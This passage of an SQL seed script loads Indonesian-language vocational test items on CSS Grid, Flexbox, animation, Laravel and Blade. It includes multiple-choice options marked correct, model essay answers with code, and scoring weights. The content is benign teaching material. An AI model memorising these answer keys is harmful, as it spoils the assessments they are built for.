    (s,'C','Membuat dua versi berbeda — satu untuk mobile, satu untuk desktop',false),
    (s,'D','Menggunakan framework mobile-native seperti React Native untuk web',false),
    (s,'E','Memprioritaskan loading CSS mobile agar halaman lebih cepat di semua perangkat',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t3, s, 3, 10);

  -- PG 4
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'CSS property yang digunakan untuk membuat animasi dengan mendefinisikan keyframe (dari state A ke state B) adalah...',
    'pg', 'sedang',
    '@keyframes mendefinisikan animasi dengan tahapan (0%/from → 100%/to atau multiple %). Property animation lalu menerapkannya: animation: namaAnimasi durasi timing-function delay iteration-count direction. Berbeda dengan transition yang hanya interpolasi antara dua state saat ada trigger (hover, focus, class change).')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','transition',false),
    (s,'B','transform',false),
    (s,'C','@keyframes + animation',true),
    (s,'D','motion',false),
    (s,'E','animate()',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t3, s, 4, 10);

  -- PG 5
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Nilai CSS Grid "fr" (fraction) pada grid-template-columns: 1fr 2fr berarti...',
    'pg', 'sedang',
    'fr (fraction unit) membagi ruang yang tersedia secara proporsional. 1fr 2fr = ruang total dibagi 3 bagian: kolom pertama dapat 1 bagian (33.33%), kolom kedua dapat 2 bagian (66.67%). Berbeda dari % karena fr dihitung dari sisa ruang setelah kolom dengan ukuran fixed (px/rem) dikurangkan — lebih fleksibel.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','Kolom pertama 1px, kolom kedua 2px',false),
    (s,'B','Kolom pertama 10%, kolom kedua 20% dari lebar container',false),
    (s,'C','Ruang tersedia dibagi 3: kolom pertama mendapat 1/3, kolom kedua mendapat 2/3',true),
    (s,'D','Kolom pertama fixed 100px, kolom kedua fixed 200px',false),
    (s,'E','Kolom pertama mengambil konten minimum, kolom kedua mengambil sisa ruang',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t3, s, 5, 10);

  -- Essay 1
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Buatlah layout halaman dashboard sekolah menggunakan CSS Grid dan Flexbox! Layout harus terdiri dari: (a) header full-width dengan logo + navigasi menggunakan Flexbox (space-between), (b) area konten utama menggunakan CSS Grid dengan sidebar kiri (250px) + konten utama (sisa ruang), (c) di dalam konten utama: 3 card statistik sejajar menggunakan Flexbox atau Grid, (d) footer full-width. Sertakan media query agar responsive di mobile (sidebar tersembunyi / pindah ke bawah konten)!',
    'essay', 'sulit',
    'Jawaban ideal:

/* === LAYOUT UTAMA === */
body {
  margin: 0;
  font-family: "Plus Jakarta Sans", sans-serif;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
}

/* (a) Header dengan Flexbox */
header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 0 2rem;
  height: 64px;
  background: #1e40af;
  color: white;
}
header .logo { font-size: 1.25rem; font-weight: 700; }
header nav { display: flex; gap: 1.5rem; }
header nav a { color: white; text-decoration: none; }

/* (b) Layout Grid: sidebar + konten */
.layout {
  display: grid;
  grid-template-columns: 250px 1fr;
  flex: 1;
  min-height: 0;
}

.sidebar {
  background: #f1f5f9;
  padding: 1.5rem;
  border-right: 1px solid #e2e8f0;
}

.main-content {
  padding: 2rem;
  overflow-y: auto;
}

/* (c) 3 Card statistik dengan CSS Grid */
.stats-grid {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 1.5rem;
  margin-bottom: 2rem;
}

.stat-card {
  background: white;
  border-radius: 12px;
  padding: 1.5rem;
  box-shadow: 0 1px 3px rgba(0,0,0,0.1);
  display: flex;
  flex-direction: column;
  gap: 0.5rem;
}
.stat-card .number { font-size: 2rem; font-weight: 700; color: #1e40af; }
.stat-card .label  { font-size: 0.875rem; color: #64748b; }

/* (d) Footer */
footer {
  padding: 1rem 2rem;
  background: #1e293b;
  color: #94a3b8;
  text-align: center;
  font-size: 0.875rem;
}

/* (d) Media query — Mobile responsive */
@media (max-width: 768px) {
  .layout {
    grid-template-columns: 1fr;   /* sidebar ke bawah konten */
  }
  .sidebar {
    order: 2;  /* konten dulu, sidebar di bawah */
    border-right: none;
    border-top: 1px solid #e2e8f0;
  }
  .main-content { order: 1; }
  .stats-grid {
    grid-template-columns: 1fr;   /* card ditumpuk vertikal di mobile */
  }
}

/* HTML struktur:
<header>
  <div class="logo">Portal Sekolah</div>
  <nav><a href="#">Dashboard</a><a href="#">Nilai</a></nav>
</header>
<div class="layout">
  <aside class="sidebar">Menu navigasi...</aside>
  <main class="main-content">
    <div class="stats-grid">
      <div class="stat-card"><span class="number">450</span><span class="label">Total Siswa</span></div>
      <div class="stat-card"><span class="number">32</span><span class="label">Total Guru</span></div>
      <div class="stat-card"><span class="number">18</span><span class="label">Mata Pelajaran</span></div>
    </div>
  </main>
</div>
<footer>© 2024 Portal Sekolah</footer>
*/

Nilai penuh: header Flexbox space-between + Grid 250px 1fr + stats 3-kolom + footer + media query mengubah grid ke 1fr dan order sidebar.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t3, s, 6, 25);

  -- Essay 2
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Jelaskan perbedaan antara CSS Flexbox dan CSS Grid! Kapan lebih tepat menggunakan masing-masing? Kemudian buatlah animasi CSS untuk tombol "Submit Tugas" yang: (a) saat normal berwarna biru, (b) saat hover: warna berubah ke hijau dengan transisi halus 0.3s, (c) saat diklik (active): tombol sedikit mengecil (scale down), (d) animasi loading spinner yang muncul setelah diklik. Sertakan kodenya!',
    'essay', 'sedang',
    'Jawaban ideal:

FLEXBOX vs GRID:

Flexbox:
- 1 dimensi: mengatur item dalam SATU baris ATAU kolom
- Ideal untuk: komponen UI (navbar, card header, button group, form row)
- Item menyesuaikan ukuran secara dinamis berdasarkan konten
- Contoh: justify-content: space-between untuk navbar

CSS Grid:
- 2 dimensi: mengatur baris DAN kolom sekaligus
- Ideal untuk: layout halaman (header/sidebar/main/footer), galeri foto, dashboard
- Lebih kuat untuk layout kompleks dengan baris+kolom simultan
- Contoh: grid-template-areas untuk named areas

Singkatnya: Flexbox untuk komponen, Grid untuk layout halaman.

KODE ANIMASI TOMBOL:

/* === Tombol + Spinner === */
.btn-submit {
  position: relative;
  padding: 0.75rem 2rem;
  background: #2563eb;       /* (a) biru */
  color: white;
  border: none;
  border-radius: 8px;
  font-size: 1rem;
  font-weight: 600;
  cursor: pointer;
  overflow: hidden;
  transition: background 0.3s ease, transform 0.1s ease, box-shadow 0.3s ease;
  display: inline-flex;
  align-items: center;
  gap: 0.5rem;
}

/* (b) Hover: hijau, halus 0.3s */
.btn-submit:hover {
  background: #16a34a;
  box-shadow: 0 4px 12px rgba(22, 163, 74, 0.4);
}

/* (c) Diklik: sedikit mengecil */
.btn-submit:active {
  transform: scale(0.95);
  background: #15803d;
}

/* (d) Loading spinner */
.spinner {
  width: 16px;
  height: 16px;
  border: 2px solid rgba(255,255,255,0.3);
  border-top-color: white;
  border-radius: 50%;
  animation: spin 0.7s linear infinite;
  display: none;  /* tersembunyi default */
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

/* Saat loading aktif */
.btn-submit.loading .spinner { display: block; }
.btn-submit.loading .btn-text { opacity: 0.7; }
.btn-submit.loading { pointer-events: none; cursor: not-allowed; }

/* HTML + JS:
<button class="btn-submit" onclick="submitTugas(this)">
  <span class="btn-text">Submit Tugas</span>
  <span class="spinner"></span>
</button>

<script>
function submitTugas(btn) {
  btn.classList.add("loading");
  // Simulasi proses async
  setTimeout(() => {
    btn.classList.remove("loading");
    btn.innerHTML = "✓ Tugas Dikirim";
    btn.style.background = "#16a34a";
  }, 2000);
}
</script>
*/

Nilai penuh: perbedaan Flexbox vs Grid + kapan pakai + tombol biru + hover hijau transition 0.3s + active scale(0.95) + @keyframes spin + spinner tersembunyi/muncul.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t3, s, 7, 25);

  -- ==========================================================
  -- TES 4: PENGENALAN LARAVEL
  -- ==========================================================

  -- PG 1
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Laravel menggunakan pola arsitektur...',
    'pg', 'mudah',
    'Laravel berbasis MVC (Model-View-Controller): Model = Eloquent ORM (interaksi database), View = Blade template (tampilan), Controller = logika bisnis dan penghubung Model-View. Selain MVC, Laravel juga mendukung pola lain seperti Repository, Service, dll sebagai tambahan.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','MVP (Model-View-Presenter)',false),
    (s,'B','MVVM (Model-View-ViewModel)',false),
    (s,'C','MVC (Model-View-Controller)',true),
    (s,'D','Microservices Architecture',false),
    (s,'E','Event-Driven Architecture',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t4, s, 1, 10);

  -- PG 2
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'File konfigurasi environment (database, API key, app key) di Laravel disimpan di...',
    'pg', 'mudah',
    'File .env di root proyek menyimpan konfigurasi yang berbeda per environment (local, staging, production). JANGAN commit .env ke git — sudah ada di .gitignore default Laravel. Nilai dari .env dibaca via fungsi env("KEY") atau config("app.key"). File config/ di Laravel membaca dari .env dan memberikan default value.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','config/database.php langsung diisi nilai koneksi',false),
    (s,'B','storage/settings.json',false),
    (s,'C','.env (file di root proyek, tidak dicommit ke git)',true),
    (s,'D','bootstrap/app.php',false),
    (s,'E','resources/config.php',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t4, s, 2, 10);

  -- PG 3
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Perintah Artisan untuk membuat Controller baru di Laravel adalah...',
    'pg', 'mudah',
    'php artisan make:controller NamaController membuat file controller di app/Http/Controllers/. Opsi tambahan: --resource (tambahkan 7 method CRUD: index, create, store, show, edit, update, destroy), --model=Nama (buat dengan type-hint model), --api (seperti resource tapi tanpa create dan edit — untuk API).')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','php artisan create:controller NamaController',false),
    (s,'B','php artisan generate:controller NamaController',false),
    (s,'C','php artisan make:controller NamaController',true),
    (s,'D','php artisan new:controller NamaController',false),
    (s,'E','php artisan controller:make NamaController',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t4, s, 3, 10);

  -- PG 4
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Middleware di Laravel berfungsi untuk...',
    'pg', 'sedang',
    'Middleware adalah lapisan yang memproses HTTP request sebelum mencapai controller (atau response sebelum kembali ke client). Digunakan untuk: autentikasi (cek login), otorisasi (cek role), logging, rate limiting, CORS headers, verifikasi CSRF. Diregistrasi di bootstrap/app.php atau langsung di route/controller.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','Menyimpan data sementara di cache antara dua request',false),
    (s,'B','Menghubungkan Model ke tabel database secara otomatis',false),
    (s,'C','Memproses HTTP request sebelum mencapai controller — untuk autentikasi, otorisasi, logging, dll',true),
    (s,'D','Mengompres aset CSS dan JavaScript sebelum dikirim ke browser',false),
    (s,'E','Mengatur koneksi ke multiple database sekaligus',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t4, s, 4, 10);

  -- PG 5
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Route di Laravel yang secara otomatis mendaftarkan 7 route CRUD standar (index, create, store, show, edit, update, destroy) adalah...',
    'pg', 'sedang',
    'Route::resource(''siswa'', SiswaController::class) otomatis mendaftarkan: GET /siswa (index), GET /siswa/create (create), POST /siswa (store), GET /siswa/{id} (show), GET /siswa/{id}/edit (edit), PUT/PATCH /siswa/{id} (update), DELETE /siswa/{id} (destroy). Bisa dibatasi dengan ->only([...]) atau ->except([...]).')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','Route::crud(''siswa'', SiswaController::class)',false),
    (s,'B','Route::all(''siswa'', SiswaController::class)',false),
    (s,'C','Route::resource(''siswa'', SiswaController::class)',true),
    (s,'D','Route::auto(''siswa'', SiswaController::class)',false),
    (s,'E','Route::restful(''siswa'', SiswaController::class)',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t4, s, 5, 10);

  -- Essay 1
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Jelaskan Request Lifecycle (siklus hidup request) di Laravel! Mulai dari browser mengirim HTTP request sampai response diterima kembali. Sebutkan minimal 6 tahap/komponen yang dilalui (index.php, Kernel, Middleware, Router, Controller, Response) dan jelaskan peran masing-masing! Kemudian jelaskan kapan dan bagaimana cara membuat custom middleware di Laravel untuk membatasi akses halaman hanya untuk user dengan role "guru"!',
    'essay', 'sulit',
    'Jawaban ideal:

REQUEST LIFECYCLE LARAVEL:

1. Browser mengirim HTTP request (misal: GET /nilai)

2. public/index.php — Entry point tunggal Laravel. Mem-bootstrap aplikasi, load Composer autoloader, membuat Application instance.

3. HTTP Kernel (app/Http/Kernel.php) — Menerima request, menjalankan global middleware stack (TrimStrings, ConvertEmptyStringsToNull, ValidateCsrfToken, dll).

4. Service Providers — Di-boot saat bootstrap: DatabaseServiceProvider, RouteServiceProvider, AuthServiceProvider, dll. Mendaftarkan binding, event listener, middleware ke container.

5. Middleware (pipeline) — Request melewati middleware yang didaftarkan per-group atau per-route (auth, throttle, verified, dll). Bisa menghentikan request (redirect jika belum login).

6. Router — Mencocokkan URI dan method HTTP dengan route yang terdaftar di routes/web.php atau routes/api.php. Menemukan controller + method yang harus dipanggil.

7. Controller — Menerima request, memanggil Model/Service untuk data, menyiapkan data untuk View.

8. Model (Eloquent) — Berkomunikasi dengan database, mengembalikan data ke Controller.

9. View (Blade) — Controller memilih view, Blade mengompilasi template + data menjadi HTML.

10. Response — HTTP response (HTML/JSON) dikirim kembali ke browser melalui Kernel → Middleware (post-response processing) → Browser.

CUSTOM MIDDLEWARE untuk role "guru":
// Buat middleware:
php artisan make:middleware EnsureIsGuru

// app/Http/Middleware/EnsureIsGuru.php:
<?php
namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;

class EnsureIsGuru {
    public function handle(Request $request, Closure $next) {
        if (!auth()->check()) {
            return redirect("/login");
        }
        if (auth()->user()->role !== "guru") {
            abort(403, "Akses hanya untuk guru.");
        }
        return $next($request); // lanjutkan ke controller
    }
}

// Daftarkan di bootstrap/app.php (Laravel 11):
->withMiddleware(function (Middleware $middleware) {
    $middleware->alias(["guru" => EnsureIsGuru::class]);
})

// Gunakan di route:
Route::middleware(["auth", "guru"])->group(function () {
    Route::resource("nilai", NilaiController::class);
    Route::get("laporan", [LaporanController::class, "index"]);
});

Nilai penuh: 6+ tahap lifecycle dengan peran masing-masing + kode EnsureIsGuru + handle() dengan cek auth + cek role + abort(403) + pendaftaran alias + penggunaan di route::middleware.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t4, s, 6, 25);

  -- Essay 2
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Jelaskan keuntungan menggunakan framework Laravel dibandingkan PHP native untuk membangun aplikasi web sekolah! Sebutkan minimal 5 fitur Laravel yang membantu developer dan jelaskan manfaat konkretnya. Kemudian, gambarkan struktur direktori proyek Laravel (minimal 8 folder/file penting) dan jelaskan fungsi masing-masing!',
    'essay', 'sedang',
    'Jawaban ideal:

5 KEUNTUNGAN LARAVEL vs PHP NATIVE:

1. Eloquent ORM — query database dengan syntax PHP yang ekspresif, tidak perlu tulis SQL manual. Relasi (hasMany, belongsTo) otomatis dihandle. Manfaat: kode lebih bersih, lebih cepat, less bug.

2. Blade Templating Engine — inheritance layout, component, directive (@if, @foreach, @auth). Manfaat: tidak ada duplikasi HTML header/footer di setiap file, template lebih terstruktur.

3. Artisan CLI — generate kode (controller, model, migration, seeder, middleware) dengan satu perintah. Manfaat: hemat waktu setup, struktur kode konsisten, tidak typo nama class.

4. Validasi bawaan — $request->validate([''email'' => ''required|email|unique:users'']). Manfaat: validasi kompleks dengan satu baris, pesan error otomatis, tidak perlu if-else validasi manual.

5. Authentication siap pakai (Laravel Breeze/Sanctum) — login, register, logout, forgot password, email verification. Manfaat: tidak perlu membangun sistem auth dari awal yang rawan bug keamanan.

Bonus: Security (CSRF protection, SQL injection prevention via Eloquent), Queue/Job (background processing), Rate Limiting, Testing framework.

STRUKTUR DIREKTORI:

app/
  Http/Controllers/   -- Logic handler request, memanggil Model & mengirim ke View
  Http/Middleware/    -- Filter request (auth, role check, CSRF, dll)
  Models/             -- Eloquent model, relasi, business logic
  Services/           -- (opsional) Business logic yang kompleks, dipisah dari controller

database/
  migrations/         -- Definisi skema tabel (versi kontrol database)
  seeders/            -- Data awal/testing yang dimasukkan ke database
  factories/          -- Data dummy untuk testing

resources/
  views/              -- Blade template (.blade.php), file tampilan
  css/ js/            -- Asset sumber sebelum dikompilasi

routes/
  web.php             -- Route untuk browser (dengan session, CSRF)
  api.php             -- Route untuk API (stateless, tanpa CSRF)

public/
  index.php           -- Entry point tunggal semua request masuk ke sini
  (css/js/images)     -- Asset yang sudah dikompilasi, bisa diakses langsung

storage/             -- Log, cache, file upload, session tersimpan di sini
config/              -- Konfigurasi: database, mail, auth, cache, dll
.env                 -- Environment variable (tidak dicommit ke git)

Nilai penuh: 5 fitur + manfaat konkret masing-masing + 8+ folder/file dengan penjelasan fungsi tepat.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t4, s, 7, 25);

  -- ==========================================================
  -- TES 5: BLADE TEMPLATING
  -- ==========================================================

  -- PG 1
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Directive Blade untuk menampilkan konten hanya jika user sudah login adalah...',
    'pg', 'mudah',
    '@auth ... @endauth menampilkan konten hanya jika user terautentikasi (sudah login). @guest ... @endguest kebalikannya — hanya tampil jika belum login. @can(''permission'') ... @endcan untuk otorisasi (cek permission/policy). Ini lebih bersih dari @if(auth()->check()) ... @endif.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','@loggedin ... @endloggedin',false),
    (s,'B','@user ... @enduser',false),
    (s,'C','@auth ... @endauth',true),
    (s,'D','@login ... @endlogin',false),
    (s,'E','@authenticated ... @endauthenticated',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t5, s, 1, 10);

  -- PG 2
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Dalam Blade layout inheritance, directive yang digunakan di child view untuk mengisi section yang didefinisikan layout adalah...',
    'pg', 'sedang',
    'Alur layout inheritance: (1) layout.blade.php mendefinisikan @yield(''content'') sebagai placeholder. (2) child.blade.php menggunakan @extends(''layouts.app'') untuk mewarisi layout, lalu @section(''content'') ... @endsection untuk mengisi placeholder. @parent di dalam section bisa memasukkan konten section dari parent.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','@include(''nama'') ... @endinclude',false),
    (s,'B','@block(''content'') ... @endblock',false),
    (s,'C','@section(''content'') ... @endsection',true),
    (s,'D','@slot(''content'') ... @endslot',false),
    (s,'E','@fill(''content'') ... @endfill',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t5, s, 2, 10);

  -- PG 3
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Perbedaan antara {{ $variable }} dan {!! $variable !!} di Blade adalah...',
    'pg', 'sedang',
    '{{ $variable }} secara otomatis menjalankan htmlspecialchars() — output di-escape, aman dari XSS. {!! $variable !!} menampilkan raw HTML tanpa escaping — gunakan HANYA jika konten sudah aman (HTML yang sudah disanitasi, bukan input user). Defaultnya selalu gunakan {{ }} kecuali memang perlu render HTML.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','{{ }} untuk string, {!! !!} untuk angka dan boolean',false),
    (s,'B','{{ }} meng-escape output (aman XSS); {!! !!} menampilkan raw HTML tanpa escaping',true),
    (s,'C','{{ }} lebih cepat; {!! !!} lebih lambat karena harus parse HTML',false),
    (s,'D','Keduanya identik — hanya sintaks alternatif Blade',false),
    (s,'E','{{ }} untuk variabel PHP; {!! !!} untuk ekspresi JavaScript',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t5, s, 3, 10);

  -- PG 4
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Directive Blade untuk merender partial view (menyertakan file Blade lain) adalah...',
    'pg', 'mudah',
    '@include(''nama.partial'', [''data'' => $value]) menyertakan file Blade lain ke dalam view saat ini. File dicari di resources/views/. Bisa pakai dot notation untuk subfolder (''components.card'' = resources/views/components/card.blade.php). Data bisa dipass sebagai array parameter kedua.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','@extend(''nama.partial'')',false),
    (s,'B','@import(''nama.partial'')',false),
    (s,'C','@include(''nama.partial'')',true),
    (s,'D','@render(''nama.partial'')',false),
    (s,'E','@partial(''nama.partial'')',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t5, s, 4, 10);

  -- PG 5
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Directive Blade yang digunakan untuk iterasi (looping) melalui collection/array adalah...',
    'pg', 'mudah',
    '@foreach($collection as $item) ... @endforeach adalah cara utama loop di Blade. Di dalam loop, tersedia variabel $loop dengan properti: $loop->index (0-based), $loop->iteration (1-based), $loop->first, $loop->last, $loop->count, $loop->remaining. Blade juga punya @forelse (dengan @empty jika collection kosong), @for, @while.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','@loop($collection as $item) ... @endloop',false),
    (s,'B','@each($collection as $item) ... @endeach',false),
    (s,'C','@foreach($collection as $item) ... @endforeach',true),
    (s,'D','@iterate($collection) ... @enditerate',false),
    (s,'E','@repeat($collection as $item) ... @endrepeat',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t5, s, 5, 10);

  -- Essay 1
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Buatlah sistem layout Blade Laravel untuk portal sekolah dengan: (a) layout utama (layouts/app.blade.php) yang berisi: meta tag, link CSS, header+navbar, section content, footer + script JS, (b) child view halaman daftar siswa (siswa/index.blade.php) yang mewarisi layout, menampilkan tabel siswa dari $siswas dengan @forelse (ada pesan jika kosong), (c) partial komponen card statistik (components/stat-card.blade.php) yang menerima variabel $judul dan $nilai!',
    'essay', 'sulit',
    'Jawaban ideal:

<!-- (a) resources/views/layouts/app.blade.php -->
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="csrf-token" content="{{ csrf_token() }}">
  <title>@yield(''title'', ''Portal Sekolah'')</title>
  <link rel="stylesheet" href="{{ asset(''css/app.css'') }}">
  @stack(''styles'')
</head>
<body>
  <header>
    <nav class="navbar">
      <a href="/" class="logo">Portal Sekolah</a>
      <div class="nav-links">
        @auth
          <span>Halo, {{ auth()->user()->name }}</span>
          <form action="/logout" method="POST" style="display:inline">
            @csrf
            <button type="submit">Logout</button>
          </form>
        @else
          <a href="/login">Login</a>
        @endauth
      </div>
    </nav>
  </header>

  <main class="container">
    @if(session(''success''))
      <div class="alert alert-success">{{ session(''success'') }}</div>
    @endif
    @if(session(''error''))
      <div class="alert alert-error">{{ session(''error'') }}</div>
    @endif

    @yield(''content'')
  </main>

  <footer>
    <p>© {{ date(''Y'') }} Portal Sekolah. All rights reserved.</p>
  </footer>

  <script src="{{ asset(''js/app.js'') }}"></script>
  @stack(''scripts'')
</body>
</html>

<!-- (b) resources/views/siswa/index.blade.php -->
@extends(''layouts.app'')

@section(''title'', ''Daftar Siswa'')

@section(''content'')
<div class="page-header">
  <h1>Daftar Siswa</h1>
  <a href="{{ route(''siswa.create'') }}" class="btn-primary">+ Tambah Siswa</a>
</div>

<div class="stats-row">
  @include(''components.stat-card'', [''judul'' => ''Total Siswa'', ''nilai'' => $siswas->count()])
  @include(''components.stat-card'', [''judul'' => ''Aktif'', ''nilai'' => $siswas->where(''aktif'', true)->count()])
</div>

<table class="table">
  <thead>
    <tr><th>No</th><th>NISN</th><th>Nama</th><th>Kelas</th><th>Aksi</th></tr>
  </thead>
  <tbody>
    @forelse($siswas as $siswa)
      <tr>
        <td>{{ $loop->iteration }}</td>
        <td>{{ $siswa->nisn }}</td>
        <td>{{ $siswa->nama_lengkap }}</td>
        <td>{{ $siswa->kelas->nama_kelas ?? ''-'' }}</td>
        <td>
          <a href="{{ route(''siswa.edit'', $siswa) }}">Edit</a>
          <form action="{{ route(''siswa.destroy'', $siswa) }}" method="POST" style="display:inline"
                onsubmit="return confirm(''Hapus siswa ini?'')">
            @csrf @method(''DELETE'')
            <button type="submit">Hapus</button>
          </form>
        </td>
      </tr>
    @empty
      <tr><td colspan="5" style="text-align:center">Belum ada data siswa.</td></tr>
    @endforelse
  </tbody>
</table>

{{ $siswas->links() }}  {{-- Pagination --}}
@endsection

<!-- (c) resources/views/components/stat-card.blade.php -->
<div class="stat-card">
  <p class="stat-label">{{ $judul }}</p>
  <p class="stat-value">{{ $nilai }}</p>
</div>

Nilai penuh: layout dengan @yield content + @stack styles/scripts + @auth/@guest di navbar + flash message session + child view @extends + @section + @forelse + @empty + $loop->iteration + partial @include dengan variabel.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t5, s, 6, 25);

  -- Essay 2
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Jelaskan konsep Blade Components di Laravel! Apa bedanya dengan @include? Kemudian buatlah Blade Component "Alert" yang bisa digunakan dengan sintaks <x-alert type="success" :message="$message" /> dan mendukung minimal 3 tipe (success, error, warning) dengan warna berbeda. Sertakan kode class component (jika diperlukan) dan file blade-nya!',
    'essay', 'sedang',
    'Jawaban ideal:

PERBEDAAN COMPONENT vs @include:

@include:
- Sertakan file Blade lain ke view saat ini
- Data dipass sebagai array: @include(''partial'', [''var'' => $val])
- Tidak punya class PHP — hanya template
- Cocok untuk partial sederhana yang tidak punya logika

Blade Component:
- Lebih terstruktur: punya file class PHP (opsional) + file blade template
